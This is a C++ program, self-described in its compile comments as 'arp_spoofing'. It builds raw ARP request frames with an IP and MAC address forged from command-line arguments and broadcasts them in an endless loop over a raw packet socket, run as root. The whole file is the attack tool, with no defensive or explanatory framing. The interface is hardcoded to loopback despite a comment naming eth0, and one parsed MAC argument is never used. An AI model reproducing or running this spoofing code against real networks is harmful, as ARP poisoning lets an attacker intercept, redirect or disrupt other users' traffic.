#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>

// ARP Packet Structure
struct arp_header {
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_size;
    uint8_t proto_size;
    uint16_t op_code;
    uint8_t src_hw_addr[ETH_ALEN];
    uint8_t src_proto_addr[4];
    uint8_t dest_hw_addr[ETH_ALEN];
    uint8_t dest_proto_addr[4];
};

// Ethernet Header
struct ethernet_header {
    uint8_t dest_mac[ETH_ALEN];
    uint8_t src_mac[ETH_ALEN];
    uint16_t ethertype;
};

// Create and send ARP packet
void send_arp_packet(const char* target_ip, const uint8_t* source_mac, const char* source_ip, const uint8_t* target_mac) {
    while (true)
    {
        int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sockfd < 0) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        struct sockaddr_ll sa;
        memset(&sa, 0, sizeof(sa));
        sa.sll_family = AF_PACKET;
        sa.sll_protocol = htons(ETH_P_ARP);

        // ARP Packet
        struct arp_header arp;
        memset(&arp, 0, sizeof(arp));
        arp.hw_type = htons(ARPHRD_ETHER);
        arp.proto_type = htons(ETH_P_IP);
        arp.hw_size = ETH_ALEN;
        arp.proto_size = sizeof(in_addr_t);
        arp.op_code = htons(ARPOP_REQUEST);
        memcpy(arp.src_hw_addr, source_mac, ETH_ALEN);
        inet_pton(AF_INET, source_ip, arp.src_proto_addr);
        memset(arp.dest_hw_addr, 0xFF, ETH_ALEN); // Broadcast MAC
        inet_pton(AF_INET, target_ip, arp.dest_proto_addr);

        // Ethernet Header
        struct ethernet_header eth;
        memset(&eth, 0, sizeof(eth));
        memset(eth.dest_mac, 0xFF, ETH_ALEN); // Broadcast MAC
        memcpy(eth.src_mac, source_mac, ETH_ALEN);
        eth.ethertype = htons(ETH_P_ARP);

        // Full Packet
        int packet_size = sizeof(ethernet_header) + sizeof(arp_header);
        char* packet = (char *)malloc(packet_size);
        if (packet == NULL) {
            perror("Memory allocation failed");
            close(sockfd);
            exit(EXIT_FAILURE);
        }
        memcpy(packet, &eth, sizeof(ethernet_header));
        memcpy(packet + sizeof(ethernet_header), &arp, sizeof(arp_header));

        // Determine interface index
        sa.sll_ifindex = if_nametoindex("lo"); // Replace "eth0" with your network interface
        if (sa.sll_ifindex == 0) {
            perror("Invalid interface");
            close(sockfd);
            free(packet);
            exit(EXIT_FAILURE);
        }

        // Send the packet
        if (sendto(sockfd, packet, packet_size, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
            perror("Send failed");
            close(sockfd);
            free(packet);
            exit(EXIT_FAILURE);
        }

        std::cout << "ARP packet sent to " << target_ip << std::endl;

        close(sockfd);
        free(packet);
    }
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <source_ip> <source_mac> <target_ip> <target_mac>" << std::endl;
        return EXIT_FAILURE;
    }

    const char* source_ip = argv[1];
    const char* source_mac_str = argv[2];
    const char* target_ip = argv[3];
    const char* target_mac_str = argv[4];

    // Convert MAC addresses from string to binary
    uint8_t source_mac[ETH_ALEN];
    uint8_t target_mac[ETH_ALEN];
    sscanf(source_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &source_mac[0], &source_mac[1], &source_mac[2],
           &source_mac[3], &source_mac[4], &source_mac[5]);
    sscanf(target_mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_mac[0], &target_mac[1], &target_mac[2],
           &target_mac[3], &target_mac[4], &target_mac[5]);

    send_arp_packet(target_ip, source_mac, source_ip, target_mac);

    return EXIT_SUCCESS;
}
// g++ -o arp_spoofing arp_spoofing.cpp
// sudo ./arp_spoofing <source_ip> <source_mac> <target_ip> <target_mac>
